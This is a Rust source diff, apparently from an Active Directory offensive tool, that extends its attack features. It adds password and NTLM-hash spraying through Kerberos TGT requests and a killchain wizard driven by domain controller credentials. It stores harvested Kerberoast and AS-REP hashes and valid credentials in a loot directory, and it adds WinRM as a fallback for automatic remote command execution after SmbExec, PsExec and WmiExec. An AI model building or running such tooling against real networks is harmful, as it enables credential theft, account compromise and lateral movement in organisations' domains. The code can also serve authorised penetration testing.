@@ -7,6 +7,7 @@ mod commands;
 mod commands_impl;
 mod cred_vault;
 mod interactive_shell;
+mod loot;
 mod modules_ext;
 mod tree_viewer;
 mod tui;
@@ -3234,13 +3235,38 @@ async fn async_main() -> i32 {
     modules_ext::register_extended_modules().await;
 
     match *cli.command {
-        Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
-            Ok(_) => 0,
-            Err(e) => {
-                banner::print_fail(&format!("Wizard error: {}", e));
-                1
+        Commands::Wizard { args } => {
+            if let (Some(dc), Some(domain), Some(user), Some(pass)) =
+                (&cli.dc_host, &cli.domain, &cli.username, &cli.password)
+            {
+                let config = commands::wizard_killchain::WizardConfig {
+                    dc_host: dc.clone(),
+                    domain: domain.clone(),
+                    username: user.clone(),
+                    password: pass.clone(),
+                    target_hosts: vec![],
+                    output_dir: cli.outfile.clone(),
+                    ldaps: false,
+                    use_hash: cli.nt_hash.is_some(),
+                };
+                let mut wizard = commands::wizard_killchain::KillchainWizard::new(config);
+                match wizard.run().await {
+                    Ok(_) => 0,
+                    Err(e) => {
+                        banner::print_fail(&format!("Killchain wizard error: {}", e));
+                        1
+                    }
+                }
+            } else {
+                match commands::wizard::run(args.clone()).await {
+                    Ok(_) => 0,
+                    Err(e) => {
+                        banner::print_fail(&format!("Wizard error: {}", e));
+                        1
+                    }
+                }
             }
-        },
+        }
         Commands::Session { ref action } => {
             match commands::session::run(commands::session::SessionArgs {
                 action: action.clone(),
@@ -3304,10 +3330,15 @@ async fn async_main() -> i32 {
             jitter,
             concurrency,
         } => {
+            // Resolve user list: local -U flag > global --user-list > LDAP > embedded
+            let effective_userlist = userlist.as_deref().or(cli.user_list.as_deref());
+            // Resolve user:pass pairs from global --user-pass-list if provided
+            let effective_user_pass = cli.user_pass_list.as_deref();
             cmd_spray(
                 &cli,
                 password,
-                userlist.as_deref(),
+                effective_userlist,
+                effective_user_pass,
                 use_ldap,
                 delay,
                 jitter,
@@ -6853,6 +6884,7 @@ async fn cmd_enum_audit(cli: &Cli) -> i32 {
 // cmd_kerberos
 #[cfg(feature = "hunter")]
 async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
+    let _ = crate::loot::ensure_loot_dir();
     banner::print_module_banner("KERBEROS");
 
     // UserEnum is a zero-knowledge operation -- no credentials needed
@@ -7012,9 +7044,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                             "[+]".green(),
                             result.hashes.len()
                         );
-                        let loot_dir = std::path::PathBuf::from("./loot");
-                        let _ = std::fs::create_dir_all(&loot_dir);
-                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
+                        let _ = crate::loot::ensure_loot_dir();
+                        let mut hash_content = String::new();
                         for h in &result.hashes {
                             println!(
                                 "{} {}: {}",
@@ -7022,15 +7053,13 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                                 h.spn.cyan(),
                                 &h.hash_string[..80.min(h.hash_string.len())]
                             );
-                            if let Ok(mut f) = std::fs::OpenOptions::new()
-                                .create(true)
-                                .append(true)
-                                .open(&hash_file)
-                            {
-                                use std::io::Write;
-                                let _ = writeln!(f, "{}", h.hash_string);
-                            }
+                            hash_content.push_str(&h.hash_string);
+                            hash_content.push('\n');
                         }
+                        let hash_file = match crate::loot::save_text("kerberoast", &hash_content) {
+                            Ok(p) => p,
+                            Err(_) => std::path::PathBuf::from("./loot/kerberoast_hashes.txt"),
+                        };
                         banner::print_success(&format!(
                             "Hashes written to {}",
                             hash_file.display()
@@ -7081,8 +7110,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             };
 
             let mut success = false;
-            let loot_dir = std::path::PathBuf::from("./loot");
-            let _ = std::fs::create_dir_all(&loot_dir);
+            let _ = crate::loot::ensure_loot_dir();
+            let mut all_hashes = String::new();
             let to_roast: Vec<&String> = if resume {
                 spns.iter()
                     .filter(|s| !ckpt_single.is_processed(s))
@@ -7107,15 +7136,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                             "[+]".green(),
                             &hash.hash_string[..80.min(hash.hash_string.len())]
                         );
-                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
-                        if let Ok(mut f) = std::fs::OpenOptions::new()
-                            .create(true)
-                            .append(true)
-                            .open(&hash_file)
-                        {
-                            use std::io::Write;
-                            let _ = writeln!(f, "{}", hash.hash_string);
-                        }
+                        all_hashes.push_str(&hash.hash_string);
+                        all_hashes.push('\n');
                         success = true;
                         ckpt_single.record(target_spn, "hash", Some(hash.hash_string.clone()));
                     }
@@ -7130,7 +7152,14 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             println!();
             if success {
                 let _ = std::fs::remove_file(&ckpt_path_single);
-                banner::print_success("Kerberoast hashes written to ./loot/kerberoast_hashes.txt");
+                let hash_file = match crate::loot::save_text("kerberoast", &all_hashes) {
+                    Ok(p) => p,
+                    Err(_) => std::path::PathBuf::from("./loot/kerberoast_hashes.txt"),
+                };
+                banner::print_success(&format!(
+                    "Kerberoast hashes written to {}",
+                    hash_file.display()
+                ));
             } else {
                 banner::print_fail("No hashes obtained");
                 return 1;
@@ -7143,9 +7172,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         } => {
             use overthrone_core::checkpoint::Checkpoint;
             use overthrone_core::proto::kerberos;
-            let loot_dir = std::path::PathBuf::from("./loot");
-            let _ = std::fs::create_dir_all(&loot_dir);
-            let output_path = loot_dir.join("asrep_hashes.txt");
+            let _ = crate::loot::ensure_loot_dir();
+            let output_path = crate::loot::timestamped_path("asrep", "txt");
             let userlist = userlist.as_deref().or(cli.user_list.as_deref());
             let dc = match require_dc(cli) {
                 Ok(d) => d,
@@ -7332,7 +7360,10 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     use_hash,
                     base_dn: None,
                     use_ldaps: false,
-                    output_dir: loot_dir.clone(),
+                    output_dir: output_path
+                        .parent()
+                        .unwrap_or(std::path::Path::new("./loot"))
+                        .to_path_buf(),
                     concurrency: 10,
                     timeout: 30,
                     jitter_ms: 0,
@@ -8699,10 +8730,36 @@ async fn cmd_exec(
             }
         }
         ExecMethod::Auto => {
-            // Try all methods in order of reliability: SmbExec -> PsExec -> WmiExec
+            // Try all methods in order of reliability: SmbExec -> PsExec -> WmiExec -> WinRM
             // SmbExec: most reliable, uses SCM pipe directly
             // PsExec: classic, creates a service
             // WmiExec: uses DCOM/WMI, good when SCM is monitored
+            // WinRM: HTTP-based fallback, doesn't depend on SMB (works when SMB2 signing fails)
+            let try_winrm = || async {
+                use overthrone_core::exec::{ExecCredentials, RemoteExecutor, winrm::WinRmExecutor};
+                let exec_creds = ExecCredentials {
+                    domain: creds.domain.clone(),
+                    username: creds.username.clone(),
+                    password: creds.password().unwrap_or("").to_string(),
+                    nt_hash: creds.nthash().map(|h| h.to_string()),
+                };
+                let executor = WinRmExecutor::new(exec_creds);
+                match executor.execute(smb_target, command).await {
+                    Ok(output) => {
+                        let combined = if output.stderr.is_empty() {
+                            output.stdout
+                        } else {
+                            format!("{}\n{}", output.stdout, output.stderr)
+                        };
+                        let success = output.exit_code.is_none_or(|c| c == 0);
+                        Ok((success, combined))
+                    }
+                    Err(e) => Err(overthrone_core::OverthroneError::ExecSimple(
+                        format!("WinRM execution failed: {}", e),
+                    )),
+                }
+            };
+
             match smbexec::exec_command(&smb, command).await {
                 Ok(r) if r.output.trim().is_empty() && !r.success => {
                     // SmbExec returned empty output — try PsExec
@@ -8716,9 +8773,14 @@ async fn cmd_exec(
                         Err(_) => {
                             // PsExec failed too — try WmiExec
                             tracing::debug!("Auto-exec: PsExec failed, trying WmiExec");
-                            wmiexec::exec_command(&smb, command)
-                                .await
-                                .map(|r| (r.success, r.output))
+                            match wmiexec::exec_command(&smb, command).await {
+                                Ok(r) => Ok((r.success, r.output)),
+                                Err(_) => {
+                                    // All SMB methods failed — try WinRM (HTTP-based)
+                                    tracing::debug!("Auto-exec: All SMB methods failed, trying WinRM");
+                                    try_winrm().await
+                                }
+                            }
                         }
                     }
                 }
@@ -8732,9 +8794,14 @@ async fn cmd_exec(
                         Ok(r) => Ok((r.success, r.output.unwrap_or_default())),
                         Err(_) => {
                             tracing::debug!("Auto-exec: PsExec failed, trying WmiExec");
-                            wmiexec::exec_command(&smb, command)
-                                .await
-                                .map(|r| (r.success, r.output))
+                            match wmiexec::exec_command(&smb, command).await {
+                                Ok(r) => Ok((r.success, r.output)),
+                                Err(_) => {
+                                    // All SMB methods failed — try WinRM (HTTP-based)
+                                    tracing::debug!("Auto-exec: All SMB methods failed, trying WinRM");
+                                    try_winrm().await
+                                }
+                            }
                         }
                     }
                 }
@@ -9178,15 +9245,18 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
 
 // cmd_spray
 #[cfg(feature = "hunter")]
+#[allow(clippy::too_many_arguments)]
 async fn cmd_spray(
     cli: &Cli,
     password: &str,
     userlist: Option<&str>,
+    user_pass_list: Option<&str>,
     use_ldap: bool,
     delay: u64,
     jitter: u64,
     _concurrency: usize,
 ) -> i32 {
+    let _ = crate::loot::ensure_loot_dir();
     banner::print_module_banner("PASSWORD SPRAY");
 
     let domain = match require_dc_only_creds(cli) {
@@ -9198,7 +9268,84 @@ async fn cmd_spray(
         Err(e) => return e,
     };
 
-    // Build username list: file -> LDAP -> embedded fallback
+    // If --user-pass-list is provided, load user:pass pairs and spray each
+    if let Some(upl_path) = user_pass_list {
+        match std::fs::read_to_string(upl_path) {
+            Ok(content) => {
+                let pairs: Vec<(String, String)> = content
+                    .lines()
+                    .filter_map(|line| {
+                        let line = line.trim().to_string();
+                        if line.is_empty() || line.starts_with('#') {
+                            return None;
+                        }
+                        // Support user:pass and user:ntlm_hash
+                        let idx = line.find(':')?;
+                        let (user, cred) = (&line[..idx], &line[idx + 1..]);
+                        Some((user.to_string(), cred.to_string()))
+                    })
+                    .collect();
+
+                if pairs.is_empty() {
+                    banner::print_fail("No valid user:pass pairs found in file");
+                    return 1;
+                }
+
+                println!(
+                    "{} Spraying {} user:pass pairs against {}",
+                    "".bright_black(),
+                    pairs.len(),
+                    domain.cyan()
+                );
+
+                let mut valid_creds = Vec::new();
+                for (user, cred) in &pairs {
+                    use overthrone_core::proto::kerberos;
+                    let res = kerberos::request_tgt(&dc, &domain, user, cred, false).await;
+                    match res {
+                        Ok(_) => {
+                            banner::print_success(&format!("{}:{}", user, cred));
+                            valid_creds.push(format!("{}:{}", user, cred));
+                        }
+                        Err(e) => {
+                            let msg = format!("{}", e);
+                            if msg.contains("LOCKED") || msg.contains("KDC_ERR_KEY_EXPIRED") {
+                                banner::print_warn(&format!("{} -- LOCKED OUT", user));
+                            }
+                        }
+                    }
+                    // Small delay between attempts
+                    tokio::time::sleep(std::time::Duration::from_millis(delay.max(50))).await;
+                }
+
+                if !valid_creds.is_empty() {
+                    println!(
+                        "\n{} {} valid credentials found!",
+                        "[+]".green(),
+                        valid_creds.len()
+                    );
+                    // Write to file
+                    let out_path = match crate::loot::save_text(
+                        "spray_valid_creds",
+                        &(valid_creds.join("\n") + "\n"),
+                    ) {
+                        Ok(p) => p,
+                        Err(_) => std::path::PathBuf::from("./loot/spray_valid_creds.txt"),
+                    };
+                    println!("  Written to {}", out_path.display());
+                } else {
+                    println!("\n{} No valid credentials found", "[-]".red());
+                }
+                return 0;
+            }
+            Err(e) => {
+                banner::print_fail(&format!("Cannot read user-pass-list {}: {}", upl_path, e));
+                return 1;
+            }
+        }
+    }
+
+    // Build username list: local -U flag > global --user-list > LDAP > embedded fallback
     let users: Vec<String> = if let Some(path) = userlist {
         match std::fs::read_to_string(path) {
             Ok(content) => content
@@ -9212,8 +9359,13 @@ async fn cmd_spray(
             }
         }
     } else if use_ldap {
-        // Try anonymous LDAP enumeration; fallback to embedded on failure
-        match overthrone_core::proto::ldap::LdapSession::connect(&dc, &domain, "", "", false).await
+        // Try authenticated LDAP enumeration; fallback to embedded on failure
+        let ldap_user = cli.username.as_deref().unwrap_or("");
+        let ldap_pass = cli.password.as_deref().unwrap_or("");
+        match overthrone_core::proto::ldap::LdapSession::connect(
+            &dc, &domain, ldap_user, ldap_pass, false,
+        )
+        .await
         {
             Ok(mut conn) => match conn.enumerate_users().await {
                 Ok(ad_users) => ad_users.into_iter().map(|u| u.sam_account_name).collect(),
@@ -9342,23 +9494,21 @@ async fn cmd_spray(
 
     // Write valid creds to file
     if !valid_creds.is_empty() {
-        let loot_dir = std::path::PathBuf::from("./loot");
-        let _ = std::fs::create_dir_all(&loot_dir);
-        let creds_file = loot_dir.join("spray_valid_creds.txt");
-        if let Ok(mut f) = std::fs::OpenOptions::new()
-            .create(true)
-            .append(true)
-            .open(&creds_file)
-        {
-            use std::io::Write;
-            for user in &valid_creds {
-                let _ = writeln!(f, "{}\\{}:{}", domain, user, password);
-            }
-        }
+        let content: String = valid_creds
+            .iter()
+            .map(|user| format!("{}\\{}:{}", domain, user, password))
+            .collect::<Vec<_>>()
+            .join("\n")
+            + "\n";
+        let creds_file = match crate::loot::save_text("spray_valid_creds", &content) {
+            Ok(p) => p,
+            Err(_) => std::path::PathBuf::from("./loot/spray_valid_creds.txt"),
+        };
         banner::print_success(&format!(
-            "{}/{} valid creds found! Written to ./loot/spray_valid_creds.txt",
+            "{}/{} valid creds found! Written to {}",
             valid_creds.len(),
-            total_users
+            total_users,
+            creds_file.display()
         ));
     } else {
         println!(
